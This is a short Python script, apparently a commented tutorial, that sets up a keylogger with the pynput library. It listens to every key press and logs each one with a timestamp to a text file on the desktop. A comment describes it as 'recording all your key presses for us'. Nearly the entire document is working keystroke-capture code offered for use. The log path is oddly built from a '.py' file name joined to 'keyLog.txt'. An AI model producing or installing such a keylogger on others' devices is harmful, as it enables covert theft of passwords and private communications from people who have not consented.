import pynput 
# python library for recording user inputs
from pynput.keyboard import Key, Listener
# recording all your key presses for us
# and then also display it
import logging
# log all details into a txt file 

log_dir = r"/Users/newuser/Desktop/keylogger.py" 
# this log file will include all of the monitor keystrokes in the format specified 
logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
# storing into log directory plus keylog.txt and then format it with time and then the message

def on_press(key):
# calling press function
# this will take every key press as a parameter and then it will log this information
    logging.info(str(key))

with Listener(on_press=on_press) as listener: 
# creating a listener instance and define the on-press method
    listener.join()
# joining with the main program thread